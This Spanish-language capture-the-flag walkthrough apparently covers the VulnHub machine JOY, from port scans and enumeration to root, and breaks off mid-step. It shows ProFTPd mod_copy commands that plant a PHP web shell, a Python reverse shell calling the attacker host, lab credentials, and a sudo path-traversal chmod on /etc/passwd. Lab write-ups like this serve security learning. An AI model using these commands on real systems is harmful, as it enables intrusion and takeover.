# JOY
Desarrollo del CTF JOY

## 1. Configuración de la VM

Descargar la VM: https://www.vulnhub.com/entry/digitalworldlocal-joy,298/

## 2. Escaneo de Puertos

### 2.1. Escaneo TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.144
Nmap scan report for 10.10.10.144
Host is up (0.00062s latency).
Not shown: 65523 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL UIDL CAPA AUTH-RESP-CODE STLS RESP-CODES PIPELINING TOP
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more have ENABLE listed LOGINDISABLEDA0001 IDLE LITERAL+ post-login capabilities ID OK IMAP4rev1 SASL-IR LOGIN-REFERRALS Pre-login STARTTLS
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imaps?
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
MAC Address: 00:0C:29:4D:45:FE (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: The,  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h40m00s, deviation: 4h37m06s, median: -1s
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2021-03-24T10:06:04+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-24T02:06:04
|_  start_date: N/A
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy1.jpg" widht=80% />

> Resalta el FTP con acceso anónimo. 

### 2.2. Escaneo UDP

- Solo muestro una parte del resultado porque es super largo.

```
nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all -oN /root/JOY/autorecon/10.10.10.144/sca
ns/_top_20_udp_nmap.txt -oX /root/JOY/autorecon/10.10.10.144/scans/xml/_top_20_udp_nmap.xml 10.10.10.144
Nmap scan report for 10.10.10.144
Host is up, received arp-response (0.00054s latency).
Scanned at 2021-03-23 22:06:23 EDT for 295s

PORT      STATE         SERVICE      REASON              VERSION
53/udp    closed        domain       port-unreach ttl 64
67/udp    closed        dhcps        port-unreach ttl 64
68/udp    open|filtered dhcpc        no-response
69/udp    closed        tftp         port-unreach ttl 64
123/udp   open          ntp          udp-response        NTP v4 (secondary server)
| ntp-info: 
|_  receive time stamp: 2021-03-24T02:10:45
135/udp   closed        msrpc        port-unreach ttl 64
137/udp   open          netbios-ns   udp-response        Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp   open|filtered netbios-dgm  no-response
139/udp   closed        netbios-ssn  port-unreach ttl 64
161/udp   open          snmp         udp-response        SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: d1785e76ec962f5c00000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 14m20s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 20.49 Kb sent, 20.49 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.10.10.144  Netmask: 255.255.255.0
|     MAC address: 00:0c:29:4d:45:fe (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Status: up
|_    Traffic stats: 153.46 Mb sent, 384.52 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:25           0.0.0.0:0
|   TCP  0.0.0.0:110          0.0.0.0:0
|   TCP  0.0.0.0:139          0.0.0.0:0
|   TCP  0.0.0.0:143          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:465          0.0.0.0:0
|   TCP  0.0.0.0:587          0.0.0.0:0
|   TCP  0.0.0.0:993          0.0.0.0:0
|   TCP  0.0.0.0:995          0.0.0.0:0
|   TCP  10.10.10.144:139     10.10.10.131:57608
|   TCP  10.10.10.144:445     10.10.10.131:46240
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:137          *:*
|   UDP  0.0.0.0:138          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:36969        *:*
|   UDP  0.0.0.0:50885        *:*
|   UDP  0.0.0.0:53140        *:*
|   UDP  10.10.10.144:123     *:*
|   UDP  10.10.10.144:137     *:*
|   UDP  10.10.10.144:138     *:*
|   UDP  10.10.10.255:137     *:*
|   UDP  10.10.10.255:138     *:*
|_  UDP  127.0.0.1:123        *:*
|   773: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
|   778: 
|     Name: ntpd
|     Path: /usr/sbin/ntpd
|     Params: -p /var/run/ntpd.pid -g -u 121:126
|   779: 
|     Name: proftpd
|     Path: proftpd: (accepting connections)
162/udp   closed        snmptrap     port-unreach ttl 64
445/udp   closed        microsoft-ds port-unreach ttl 64
500/udp   closed        isakmp       port-unreach ttl 64
514/udp   closed        syslog       port-unreach ttl 64
520/udp   closed        route        port-unreach ttl 64
631/udp   closed        ipp          port-unreach ttl 64
1434/udp  closed        ms-sql-m     port-unreach ttl 64
1900/udp  closed        upnp         port-unreach ttl 64
4500/udp  closed        nat-t-ike    port-unreach ttl 64
49152/udp closed        unknown      port-unreach ttl 64
MAC Address: 00:0C:29:4D:45:FE (VMware)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/23%OT=%CT=%CU=53%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=605A9FC6%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy2.jpg" widht=80% />

- Aquí podemos identificar dos cosas importantes: SNMP abierto y el protocolo TFTP (en la enumeración aparece el proceso corriendo por el puerto 36969)

<img src="https://github.com/El-Palomo/JOY/blob/main/joy3.jpg" widht=80% />

## 3. Proceso de Enumeración

### 3.1. Enumeración NETBIOS/SMB 

```
enum4linux -a -M -l -d 10.10.10.144

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Mar 23 22:07:28 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.144
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.144    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.10.144    |
 ============================================ 
Looking up status of 10.10.10.144
	JOY             <00> -         B <ACTIVE>  Workstation Service
	JOY             <03> -         B <ACTIVE>  Messenger Service
	JOY             <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.10.144    |
 ===================================== 
[+] Server 10.10.10.144 allows sessions using username '', password ''

 ===================================================== 
|    Getting information via LDAP for 10.10.10.144    |
 ===================================================== 
[E] Connection error

 =========================================== 
|    Getting domain SID for 10.10.10.144    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
 ====================================== 
|    OS information on 10.10.10.144    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.144 from smbclient: 
[+] Got OS info for 10.10.10.144 from srvinfo:
	JOY            Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.10.144    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================== 
|    Machine Enumeration on 10.10.10.144    |
 =========================================== 
[E] Internal error.  Not implmented in this version of enum4linux.

 ========================================= 
|    Share Enumeration on 10.10.10.144    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.144
//10.10.10.144/print$	Mapping: DENIED, Listing: N/A
//10.10.10.144/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.10.144    |
 ==================================================== 


[+] Attaching to 10.10.10.144 using a NULL share

[+] Trying protocol 139/SMB...

[+] Enumerating users using SID S-1-5-21-2865746926-266277720-3235246268 and logon username '', password ''
S-1-5-21-2865746926-266277720-3235246268-500 *unknown*\*unknown* (8)
S-1-5-21-2865746926-266277720-3235246268-501 JOY\nobody (Local User)
	User Name   :	nobody
	Full Name   :	nobody
	Home Drive  :	
	Dir Drive   :	(null)
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 13 Sep 30828 22:48:05 EDT
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Wed, 31 Dec 1969 19:00:00 EST
	Password can change Time :	Wed, 31 Dec 1969 19:00:00 EST
	Password must change Time:	Wed, 31 Dec 1969 19:00:00 EST
	unknown_2[0..31]...
	user_rid :	0x1f5
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\patrick (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

S-1-22-1-1001 Unix User\ftp (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.


 ============================================= 
|    Getting printer info for 10.10.10.144    |
 ============================================= 
No printers returned.
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy4.jpg" widht=80% />

> Resaltan los usuarios: patrick y ftp.

- No hay carpetas compartidas:

```
root@kali:~/JOY/autorecon/10.10.10.144/scans# smbclient -L \\10.10.10.149 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

```

### 3.2. Enumeración FTP

```
root@kali:~/JOY/autorecon/10.10.10.144/scans# ftp 10.10.10.149
Connected to 10.10.10.149.
220 The Good Tech Inc. FTP Server
Name (10.10.10.149:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Mar 26 04:25 download
drwxrwxr-x   2 ftp      ftp          4096 Mar 24 03:43 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp         71413 Mar 26 09:45 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy5.jpg" widht=80% />

- Dentro hay un archivo llamado "DIRECTORY" que parece el listado del usuario PATRICK, es decir, /home/patrick/

```
ftp> get directory
local: directory remote: directory
200 PORT command successful
150 Opening BINARY mode data connection for directory (71413 bytes)
226 Transfer complete
71413 bytes received in 0.00 secs (120.1142 MB/s)
ftp> exit
221 Goodbye.
root@kali:~/JOY/autorecon/10.10.10.144/scans# cat directory | m ore
bash: m: command not found
root@kali:~/JOY/autorecon/10.10.10.144/scans# cat directory | more
Patrick's Directory

total 1540
drwxr-xr-x 18 patrick patrick 65536 Mar 26 17:40 .
drwxr-xr-x  4 root    root     4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick    24 Mar 24 10:50 06SmKvMdunX6HTQ48pM1R3dAcNniv9rDfwSYUEKhuE0op74rmTIAOsbMBz1RDKnR.txt
-rw-r--r--  1 patrick patrick     0 Mar 24 19:25 070NZ3noE57U1J3fGSCBG9ggyxd2yAjv.txt
-rw-r--r--  1 patrick patrick    24 Mar 24 22:30 0Cx0MinTVxlxohLnBcIBRcdr4gzgbAtwPR2vfC6gp4L1IAYqngKkL3mrjkecJQH7.txt
-rw-r--r--  1 patrick patrick    24 Mar 25 01:40 0EKZC4Ib6a0dy3VpXLySBo7fYOapvonEBpWCsegaTru47KjkzR0JxMtuSZFX5t2M.txt
-rw-r--r--  1 patrick patrick    24 Mar 25 01:50 0JEtZJJEgYArxQNVyeYwhbffHOdJSv0sCYvJUmMAXTxmK7KMbGIJo25ZqGGVe72l.txt
-rw-r--r--  1 patrick patrick     0 Mar 24 18:15 0LCuxHRAwiC46lX1lefmV3lPFykGWMc1.txt
-rw-r--r--  1 patrick patrick     0 Mar 25 06:40 0Ln78lcI3mf6TWFeDDWTImHoDaNNNlTu.txt
-rw-r--r--  1 patrick patrick    24 Mar 25 06:15 0pS6pBYj6l5QZrQQs5Mw9SOF5YKyZ7cbO1w9VrwngMuY0JyHExBM5yng2q4CvB7h.txt
-rw-r--r--  1 patrick patrick     0 Mar 24 17:45 0riJlx1B4XVdugCzBd19ttUc3CuFBcj0.txt
-rw-r--r--  1 patrick patrick    24 Mar 25 03:35 0RpeeFmsHC7UphR2X1PX5vf8hgzuLfUtEmbt73oL0o7uj1BVVQSR3yg1EPAZjcjy.txt
-rw-r--r--  1 patrick patrick     0 Mar 24 23:15 0swD1aM52wqyyV85BcYwO6WetRzDs34F.txt
-rw-r--r--  1 patrick patrick    24 Mar 25 03:20 0XdqhMfoY5quQRWNhOFoAhSTpG8AjPpd5C3VzLvQgPJAElEdmxz3lVb1pTAeNXU8.txt
-rw-r--r--  1 patrick patrick     0 Mar 26 12:25 14QFPL4CgxIUcyZ8oXPb06g08sT4nkw5.txt
-rw-r--r--  1 patrick patrick     0 Mar 24 17:15 16i56lI7LSHUc9JcQzKsaf4lp9XXYQmP.txt
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy6.jpg" widht=80% />


### 3.3. Enumeración SNMP

- Muestro un resumen de la enumeración por SNMPWALK para no extender el resultado.

```
snmpwalk -c public -v 1 10.10.10.144

iso.3.6.1.2.1.1.1.0 = STRING: "Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (89894) 0:14:58.94
iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
iso.3.6.1.2.1.1.5.0 = STRING: "JOY"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.25.4.2.1.2.773 = STRING: "in.tftpd"
iso.3.6.1.2.1.25.4.2.1.4.773 = STRING: "/usr/sbin/in.tftpd"
iso.3.6.1.2.1.25.4.2.1.5.773 = STRING: "--listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick"
iso.3.6.1.2.1.25.6.3.1.2.1434 = STRING: "tftpd-hpa-5.2+20150808-1+b1"
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy6.jpg" widht=80% />

> Obtenemos que el servicio TFTP esta corriendo por UDP/36969. Un puerto nuevo a tener en cuenta.
 
<img src="https://github.com/El-Palomo/JOY/blob/main/joy7.jpg" widht=80% />


### 3.3. Enumeración HTTP TCP/80

- GoBUSTER y DIRSEARCH no arrojan nada importante. Solo podemos ver que existe una carpeta OSSEC
- Busqué en GOOGLE y OSSEC es una herramienta IPS/IDS que monitorea cambios de archivos en el sistema operativo.
- EXPLOIT-DB nos indica vulnerabilidades pero a nivel de ELEVACIÓN DE PRIVILEGIOS.

<img src="https://github.com/El-Palomo/JOY/blob/main/joy8.jpg" widht=80% />

## 4. Explotación de Vulnerabilidad

> El camino identificado es el siguiente:

1. Conectarnos por TFTP y descargar archivos. TFTP no permite listar archivos.
2. Los archivos a decargar se encuentran listados a través de FTP, en el archivo "DIRECTORY" que encontramos durante la enumeración.
3. En los archivos descargados nos brindan una PISTA que utilizaremos para explotar la vulnerabilidad.


```
root@kali:~/JOY# tftp 10.10.10.149 36969
tftp> status
Connected to 10.10.10.149.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> help
?Invalid command
tftp> ?
Commands may be abbreviated.  Commands are:

connect 	connect to remote tftp
mode    	set file transfer mode
put     	send file
get     	receive file
quit    	exit tftp
verbose 	toggle verbose mode
trace   	toggle packet tracing
status  	show current status
binary  	set mode to octet
ascii   	set mode to netascii
rexmt   	set per-packet retransmission timeout
timeout 	set total retransmission timeout
?       	print help information
tftp> get version_control
Received 419 bytes in 0.0 seconds
tftp> quit
root@kali:~/JOY# cat version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
```

- Toca descargar todos los archivos en busca de algún mensaje "interesante". El archivo importante es: "version_control"

<img src="https://github.com/El-Palomo/JOY/blob/main/joy9.jpg" widht=80% />

- Nos brindan las versiones del software, no es casualidad. EXPLOIT-DB nos indica la vulnerabilidad en el servicio ProFTPd.
- Toca leer sobre la vulnerabilidad y documentarse al respecto. Al ejecutar ciertos comandos a través de ProFTPd es posible escribir un archivo en el sistema operativo, vamos a escribir un archivo PHP en la ruta que nos dieron como pista: /var/www/tryingharderisjoy.
- Importante: si no lees y entiendes la vulnerabilidad te quedarás atacasdo en este punto.

<img src="https://github.com/El-Palomo/JOY/blob/main/joy10.jpg" widht=80% />


### 4.1. Explotando Vuln. ProFTPd

<img src="https://github.com/El-Palomo/JOY/blob/main/joy11.jpg" widht=80% />

- Aquí puedes leer más sobre la vulnerabilidad: https://github.com/t0kx/exploit-CVE-2015-3306

```
root@kali:~/JOY# nc 10.10.10.149 21
220 The Good Tech Inc. FTP Server
site cpfr /proc/self/cmdline
350 File or directory exists, ready for destination name
site cpto /tmp/.<?php echo passthru($_GET['cmd']); ?>
250 Copy successful
site cpfr /tmp/.<?php echo passthru($_GET['cmd']); ?>
350 File or directory exists, ready for destination name
site cpto /var/www/tryingharderisjoy/reverse.php
250 Copy successful
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy12.jpg" widht=80% />

> Obtenemos una conexión REVERSA.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.133",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


root@kali:~/JOY# netcat -lvp 443
Connection from 10.10.10.149:39292
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@JOY:/var/www/tryingharderisjoy$ hostname
hostname
JOY
www-data@JOY:/var/www/tryingharderisjoy$ 
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy13.jpg" widht=80% />

### 4.2. Explorando archivos

```
www-data@JOY:/var/www/tryingharderisjoy$ cd ossec
cd ossec
www-data@JOY:/var/www/tryingharderisjoy/ossec$ ls -la
ls -la
total 116
drwxr-xr-x 8 www-data www-data  4096 Jan  6  2019 .
drwxr-xr-x 3 www-data www-data  4096 Mar 26 18:26 ..
-rw-r--r-- 1 www-data www-data    92 Jul 19  2016 .hgtags
-rw-r--r-- 1 www-data www-data   262 Dec 28  2018 .htaccess
-rw-r--r-- 1 www-data www-data    44 Dec 28  2018 .htpasswd
-rwxr-xr-x 1 www-data www-data   317 Jul 19  2016 CONTRIB
-rw-r--r-- 1 www-data www-data 35745 Jul 19  2016 LICENSE
-rw-r--r-- 1 www-data www-data  2106 Jul 19  2016 README
-rw-r--r-- 1 www-data www-data   923 Jul 19  2016 README.search
drwxr-xr-x 3 www-data www-data  4096 Jul 19  2016 css
-rw-r--r-- 1 www-data www-data   218 Jul 19  2016 htaccess_def.txt
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 img
-rwxr-xr-x 1 www-data www-data  5177 Jul 19  2016 index.php
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 js
drwxr-xr-x 3 www-data www-data  4096 Dec 28  2018 lib
-rw-r--r-- 1 www-data www-data   462 Jul 19  2016 ossec_conf.php
-rw-r--r-- 1 www-data www-data   134 Jan  6  2019 patricksecretsofjoy
-rwxr-xr-x 1 www-data www-data  2471 Jul 19  2016 setup.sh
drwxr-xr-x 2 www-data www-data  4096 Dec 28  2018 site
drwxrwxrwx 2 www-data www-data  4096 Mar 26 12:43 tmp
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

- Dentro de la carpeta /var/www/tryingharderisjoy/ossec encontramos el archivo "patricksecretsofjoy" que contiene credenciales de acceso.

<img src="https://github.com/El-Palomo/JOY/blob/main/joy14.jpg" widht=80% />

- El password para el usuario PATRICK funciona bien.

```
www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
su patrick
Password: apollo098765

patrick@JOY:/var/www/tryingharderisjoy/ossec$ whoami
whoami
patrick
patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
```


## 5. Elevar Privilegios

### 5.1. SUDO para elevar privilegios

- Como siempre toca evaluar todos los posibles caminos, esta vez se puede elevar privilegios a través de SUDO.

```
patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo /home/patrick/script/test
sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
../../../etc/passwd
../../../etc/passwd
What permissions would you like to set the file to?
777
777
Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:/var/www/tryingharderisjoy/ossec$ ls -la /etc/passwd
ls -la /etc/passwd
-rwxrwxrwx 1 root root 2912 Mar 26 14:16 /etc/passwd
```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy15.jpg" widht=80% />


### 5.2. Modificando el PASSWD

- Una vez que tenemos permisos para modificar el archivo PASSWD ya podemos convertirnos en ROOT.

```
/*En KALI lINUX*/
root@kali:~/JOY# mkpasswd  -m sha-512 -S saltsalt -s
Password: 12345678
$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.
root@kali:~/JOY# nano add.txt
root@kali:~/JOY# cat add.txt 
